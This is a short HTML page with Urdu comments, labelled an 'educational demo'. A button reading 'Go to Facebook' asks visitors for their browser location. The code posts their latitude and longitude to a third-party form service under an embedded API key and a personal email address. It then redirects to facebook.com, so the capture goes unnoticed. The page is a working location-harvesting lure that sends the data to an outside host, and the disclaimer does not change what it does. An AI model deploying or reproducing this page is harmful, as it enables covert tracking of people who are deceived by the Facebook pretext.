# Facebook-profile
<!DOCTYPE html>
<html>
<head>
    <title>Educational Demo</title>
    <script>
        // لوکیشن حاصل کرنے کی کوشش (صارف کی اجازت ضروری ہے)
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        sendToServer(lat, lng); // ڈیٹا سرور پر بھیجیں
                        window.location.href = "https://www.facebook.com"; // ری ڈائریکٹ
                    },
                    (error) => {
                        alert("اجازت نہیں ملی۔");
                    }
                );
            } else {
                alert("براؤزر لوکیشن کو سپورٹ نہیں کرتا۔");
            }
        }

        // ڈیٹا بھیجنے کا فنکشن
        async function sendToServer(lat, lng) {
            const API_KEY = "1eebf7fe-5c1c-4cfd-b2e9-e0ca02ecc276"; // نیا API Key
            const response = await fetch("https://api.web3forms.com/submit", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    access_key: API_KEY,
                    latitude: lat,
                    longitude: lng,
                    email: "mmohsin.hec@gmail.com" // آپ کی ای میل
                })
            });
        }
    </script>
</head>
<body>
    <button onclick="getLocation()">فیس بک پر جائیں</button>
    <p style="color: red; font-size: 0.8em;">
        نوٹ: براؤزر ہمیشہ لوکیشن کی اجازت مانگے گا۔ یہ صرف تعلیمی نمونہ ہے۔
    </p>
</body>
</html>
